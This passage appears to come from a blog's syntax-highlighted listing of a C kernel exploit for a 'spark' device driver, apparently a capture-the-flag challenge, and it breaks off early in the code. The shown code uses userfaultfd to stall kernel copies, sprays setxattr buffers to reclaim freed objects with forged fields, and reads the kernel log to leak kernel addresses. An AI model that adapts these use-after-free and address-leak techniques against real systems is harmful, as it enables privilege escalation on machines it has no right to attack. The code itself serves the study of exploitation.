class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br><span class="line">497</span><br><span class="line">498</span><br><span class="line">499</span><br><span class="line">500</span><br><span class="line">501</span><br><span class="line">502</span><br><span class="line">503</span><br><span class="line">504</span><br><span class="line">505</span><br><span class="line">506</span><br><span class="line">507</span><br><span class="line">508</span><br><span class="line">509</span><br><span class="line">510</span><br><span class="line">511</span><br><span class="line">512</span><br><span class="line">513</span><br><span class="line">514</span><br><span class="line">515</span><br><span class="line">516</span><br><span class="line">517</span><br><span class="line">518</span><br><span class="line">519</span><br><span class="line">520</span><br><span class="line">521</span><br><span class="line">522</span><br><span class="line">523</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> _GNU_SOURCE</span><br><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdint.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;assert.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;sys/ioctl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;pthread.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;sys/mman.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;syscall.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;linux/userfaultfd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;poll.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;sys/xattr.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;errno.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;signal.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;sys/klog.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdbool.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;semaphore.h&gt;</span> <span class="hljs-comment">//used to set uffd interface</span></span><br><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> DEV_PATH <span class="hljs-meta-string">&quot;/dev/node&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> SPARK_FINALIZE 0xd902</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> SPARK_LINK 0x4008d900</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> SPARK_QUERY 0xc010d903</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> SPARK_INFO 0x8018D901</span><br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">spark_ioctl_query</span></span><br><span class="hljs-class">&#123;</span><br>    <span class="hljs-keyword">int</span> fd1;<br>    <span class="hljs-keyword">int</span> fd2;<br>    <span class="hljs-keyword">long</span> <span class="hljs-keyword">long</span> distance;<br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">spark_info</span></span><br><span class="hljs-class">&#123;</span><br>    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> num_children;<br>    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> traversal_idx;<br>    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> traversal_size;<br>&#125;;<br><br><span class="hljs-keyword">static</span> <span class="hljs-keyword">unsigned</span> g_create_next_id;<br><br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">int</span> <span class="hljs-title">create</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">int</span> fd = open(DEV_PATH, O_RDONLY);<br>    assert(fd != <span class="hljs-number">-1</span>);<br>    g_create_next_id++;<br>    <span class="hljs-keyword">return</span> fd;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">llink</span><span class="hljs-params">(<span class="hljs-keyword">int</span> a, <span class="hljs-keyword">int</span> b, <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> weight)</span></span><br><span class="hljs-function"></span>&#123;<br>    assert(ioctl(a, SPARK_LINK, b | ((<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> <span class="hljs-keyword">long</span>)weight &lt;&lt; <span class="hljs-number">32</span>)) == <span class="hljs-number">0</span>);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">long</span> <span class="hljs-keyword">long</span> <span class="hljs-title">query</span><span class="hljs-params">(<span class="hljs-keyword">int</span> a, <span class="hljs-keyword">int</span> b)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">spark_ioctl_query</span> <span class="hljs-title">qry</span> =</span> &#123;<br>        .fd1 = a,<br>        .fd2 = b,<br>    &#125;;<br>    assert(ioctl(a, SPARK_QUERY, &amp;qry) == <span class="hljs-number">0</span>);<br>    <span class="hljs-keyword">return</span> qry.distance;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">finalize</span><span class="hljs-params">(<span class="hljs-keyword">int</span> a)</span></span><br><span class="hljs-function"></span>&#123;<br>    assert(ioctl(a, SPARK_FINALIZE) == <span class="hljs-number">0</span>);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">get_info</span><span class="hljs-params">(<span class="hljs-keyword">int</span> a, struct spark_info *info)</span></span><br><span class="hljs-function"></span>&#123;<br>    assert(ioctl(a, SPARK_INFO, info) == <span class="hljs-number">0</span>);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">release</span><span class="hljs-params">(<span class="hljs-keyword">int</span> a)</span></span><br><span class="hljs-function"></span>&#123;<br>    assert(close(a) == <span class="hljs-number">0</span>);<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">fault_arg</span></span><br><span class="hljs-class">&#123;</span><br>    <span class="hljs-keyword">sem_t</span> fault_sem;<br>    <span class="hljs-keyword">sem_t</span> unblock_sem;<br>    <span class="hljs-keyword">void</span> *addr;<br>&#125;;<br><br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> *<span class="hljs-title">fault_thread</span><span class="hljs-params">(<span class="hljs-keyword">void</span> *arg)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">fault_arg</span> *<span class="hljs-title">param</span> =</span> (struct fault_arg *)arg;<br><br>    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span> *page = mmap(<span class="hljs-literal">NULL</span>, <span class="hljs-number">0x1000</span>, PROT_READ | PROT_WRITE, MAP_ANONYMOUS | MAP_PRIVATE, <span class="hljs-number">-1</span>, <span class="hljs-number">0</span>);<br>    assert(page != MAP_FAILED);<br>    page[<span class="hljs-number">0</span>] = <span class="hljs-number">0xff</span>; <span class="hljs-comment">// top byte for traversal addr</span><br><br>    <span class="hljs-comment">// create a userfaultfd object</span><br>    <span class="hljs-keyword">int</span> uffd = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK);<br>    assert(uffd != <span class="hljs-number">-1</span>);<br><br>    <span class="hljs-comment">// enable the userfaultfd object</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">uffdio_api</span> <span class="hljs-title">uffdio_api</span>;</span><br>    uffdio_api.api = UFFD_API;<br>    uffdio_api.features = <span class="hljs-number">0</span>;<br>    assert(ioctl(uffd, UFFDIO_API, &amp;uffdio_api) == <span class="hljs-number">0</span>);<br><br>    <span class="hljs-comment">// n_addr is the start of where you want to catch the pagefault. In our</span><br>    <span class="hljs-comment">// case, we set it to the address of page 2</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">uffdio_register</span> <span class="hljs-title">uffdio_register</span>;</span><br>    uffdio_register.range.start = (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>)param-&gt;addr;<br>    uffdio_register.range.len = <span class="hljs-number">0x1000</span>;<br>    uffdio_register.mode = UFFDIO_REGISTER_MODE_MISSING;<br>    assert(ioctl(uffd, UFFDIO_REGISTER, &amp;uffdio_register) == <span class="hljs-number">0</span>);<br><br>    assert(sem_post(&amp;param-&gt;fault_sem) == <span class="hljs-number">0</span>);<br><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pollfd</span> <span class="hljs-title">pollfd</span>;</span><br>    <span class="hljs-keyword">int</span> nready;<br>    pollfd.fd = uffd;<br>    pollfd.events = POLLIN;<br>    nready = poll(&amp;pollfd, <span class="hljs-number">1</span>, <span class="hljs-number">-1</span>);<br>    assert(nready != <span class="hljs-number">-1</span>);<br><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">uffd_msg</span> <span class="hljs-title">msg</span>;</span><br>    assert(read(uffd, &amp;msg, <span class="hljs-keyword">sizeof</span>(msg)) == <span class="hljs-keyword">sizeof</span>(msg));<br>    assert(msg.event == UFFD_EVENT_PAGEFAULT);<br><br>    assert(sem_post(&amp;param-&gt;fault_sem) == <span class="hljs-number">0</span>);<br>    <span class="hljs-comment">// wait until reclaim_free is called. but in stage1 it doesn&#x27;t exist.</span><br>    assert(sem_wait(&amp;param-&gt;unblock_sem) == <span class="hljs-number">0</span>);<br><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">uffdio_copy</span> <span class="hljs-title">uffdio_copy</span>;</span><br>    uffdio_copy.src = (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>)page;<br>    uffdio_copy.dst = (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>)msg.arg.pagefault.address &amp; ~<span class="hljs-number">0xfff</span>UL;<br>    uffdio_copy.len = <span class="hljs-number">0x1000</span>;<br>    uffdio_copy.mode = <span class="hljs-number">0</span>;<br>    uffdio_copy.copy = <span class="hljs-number">0</span>;<br>    assert(ioctl(uffd, UFFDIO_COPY, &amp;uffdio_copy) == <span class="hljs-number">0</span>);<br><br>    close(uffd);<br>    munmap(page, <span class="hljs-number">0x1000</span>);<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">setxattr_arg</span></span><br><span class="hljs-class">&#123;</span><br>    <span class="hljs-keyword">const</span> <span class="hljs-keyword">void</span> *buf;<br>    <span class="hljs-keyword">size_t</span> size;<br>&#125;;<br><br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> *<span class="hljs-title">setxattr_thread</span><span class="hljs-params">(<span class="hljs-keyword">void</span> *arg)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">setxattr_arg</span> *<span class="hljs-title">param</span> =</span> (struct setxattr_arg *)arg;<br>    assert(setxattr(<span class="hljs-string">&quot;.&quot;</span>, <span class="hljs-string">&quot;nonexistent&quot;</span>, param-&gt;buf, param-&gt;size, XATTR_REPLACE) == <span class="hljs-number">-1</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">reclaim_ctx</span></span><br><span class="hljs-class">&#123;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">fault_arg</span> <span class="hljs-title">fault_arg</span>;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">setxattr_arg</span> <span class="hljs-title">setxattr_arg</span>;</span><br>    <span class="hljs-keyword">pthread_t</span> setxattr_handle;<br>&#125;;<br><br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">reclaim_alloc_raw</span><span class="hljs-params">(struct reclaim_ctx *ctx, <span class="hljs-keyword">char</span> *buf)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">char</span> *mem = mmap(<span class="hljs-literal">NULL</span>, <span class="hljs-number">0x2000</span>, PROT_READ | PROT_WRITE, MAP_ANONYMOUS | MAP_PRIVATE, <span class="hljs-number">-1</span>, <span class="hljs-number">0</span>);<br>    assert(mem != MAP_FAILED);<br><br>    ctx-&gt;fault_arg.addr = mem + <span class="hljs-number">0x1000</span>;<br>    assert(sem_init(&amp;ctx-&gt;fault_arg.fault_sem, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>) == <span class="hljs-number">0</span>);<br>    assert(sem_init(&amp;ctx-&gt;fault_arg.unblock_sem, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>) == <span class="hljs-number">0</span>);<br><br>    <span class="hljs-keyword">pthread_t</span> handle;<br>    assert(pthread_create(&amp;handle, <span class="hljs-literal">NULL</span>, fault_thread, &amp;ctx-&gt;fault_arg) == <span class="hljs-number">0</span>);<br>    assert(sem_wait(&amp;ctx-&gt;fault_arg.fault_sem) == <span class="hljs-number">0</span>);<br><br>    <span class="hljs-keyword">char</span> *node = mem + <span class="hljs-number">0x1000</span> - <span class="hljs-number">0x7e</span>;<br>    <span class="hljs-comment">// memcpy could cross boundaries</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">0x7e</span>; i++)<br>        node[i] = buf[i];<br><br>    ctx-&gt;setxattr_arg.buf = node;<br>    ctx-&gt;setxattr_arg.size = <span class="hljs-number">0x7f</span>; <span class="hljs-comment">// avoid copy_from_user 16b optimization</span><br>    assert(pthread_create(&amp;ctx-&gt;setxattr_handle, <span class="hljs-literal">NULL</span>, setxattr_thread, &amp;ctx-&gt;setxattr_arg) == <span class="hljs-number">0</span>);<br><br>    assert(sem_wait(&amp;ctx-&gt;fault_arg.fault_sem) == <span class="hljs-number">0</span>);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">reclaim_alloc</span><span class="hljs-params">(struct reclaim_ctx *ctx, <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> is_finalized,</span></span><br><span class="hljs-params"><span class="hljs-function">                          <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> num_children, <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> traversal_idx,</span></span><br><span class="hljs-params"><span class="hljs-function">                          <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> traversal)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">char</span> buf[<span class="hljs-number">0x80</span>];<br>    <span class="hljs-built_in">memset</span>(buf, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(buf));<br>    *(<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> *)(buf + <span class="hljs-number">0x8</span>) = <span class="hljs-number">1</span>;               <span class="hljs-comment">// refcount</span><br>    *(<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> *)(buf + <span class="hljs-number">0x30</span>) = is_finalized;   <span class="hljs-comment">// is_finalized</span><br>    *(<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> *)(buf + <span class="hljs-number">0x58</span>) = num_children;  <span class="hljs-comment">// num_children</span><br>    *(<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> *)(buf + <span class="hljs-number">0x70</span>) = traversal_idx; <span class="hljs-comment">// traversal_idx</span><br>    *(<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> *)(buf + <span class="hljs-number">0x78</span>) = traversal;     <span class="hljs-comment">// traversal</span><br><br>    reclaim_alloc_raw(ctx, buf);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">reclaim_free</span><span class="hljs-params">(struct reclaim_ctx *ctx)</span></span><br><span class="hljs-function"></span>&#123;<br>    assert(sem_post(&amp;ctx-&gt;fault_arg.unblock_sem) == <span class="hljs-number">0</span>);<br>    assert(pthread_join(ctx-&gt;setxattr_handle, <span class="hljs-literal">NULL</span>) == <span class="hljs-number">0</span>);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">stage1_leak_dmesg</span><span class="hljs-params">(<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> *dist_addrp, <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> *edges_addrp)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">int</span> i, sz;<br>    <span class="hljs-keyword">char</span> *buf;<br><br>    <span class="hljs-comment">//*query the size of the kernel ring buffer</span><br>    sz = klogctl(<span class="hljs-number">10</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>);<br>    assert(sz != <span class="hljs-number">-1</span>);<br><br>    buf = <span class="hljs-built_in">malloc</span>(sz);<br>    <span class="hljs-comment">//*read all message from the kernel buffer into @buf.</span><br>    assert(klogctl(<span class="hljs-number">3</span>, buf, sz) != <span class="hljs-number">-1</span>);<br><br>    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> dist_addr = <span class="hljs-number">0</span>, edges_addr = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; sz &amp;&amp; (!dist_addr || !edges_addr); i++)<br>    &#123;<br>        <span class="hljs-comment">//*rax stores dis_arr</span><br>        <span class="hljs-keyword">if</span> (!dist_addr &amp;&amp; !<span class="hljs-built_in">strncmp</span>(buf + i, <span class="hljs-string">&quot;RAX: &quot;</span>, <span class="hljs-number">5</span>))<br>        &#123;<br>            <span class="hljs-keyword">if</span> (<span class="hljs-built_in">sscanf</span>(buf + i + <span class="hljs-number">5</span>, <span class="hljs-string">&quot;%lx&quot;</span>, &amp;dist_addr) != <span class="hljs-number">1</span>)<br>                dist_addr = <span class="hljs-number">0</span>;<br>        &#125;<br>        <span class="hljs-comment">//*r9 stores the edge</span><br>        <span class="hljs-keyword">if</span> (!edges_addr &amp;&amp; !<span class="hljs-built_in">strncmp</span>(buf + i, <span class="hljs-string">&quot;R09: &quot;</span>, <span class="hljs-number">5</span>))<br>        &#123;<br>            <span class="hljs-keyword">if</span> (<span class="hljs-built_in">sscanf</span>(buf + i + <span class="hljs-number">5</span>, <span class="hljs-string">&quot;%lx&quot;</span>, &amp;edges_addr) != <span class="hljs-number">1</span>)<br>                edges_addr = <span class="hljs-number">0</span>;<br>        &#125;<br>    &#125;<br>    assert(dist_addr &amp;&amp; edges_addr);<br><br>    <span class="hljs-built_in">free</span>(buf);<br><br>    *dist_addrp = dist_addr;<br>    *edges_addrp = edges_addr;<br>&#125;<br><br><span class="hljs-comment">// resulting size should be in a rarely used cache</span><br><span class="hljs-comment">// this is supposed to be arbitrary but if you change it you&#x27;ll mess up stage 3</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> S1_DIST_NUM_NODES 12</span><br><br><span class="hljs-function"><span 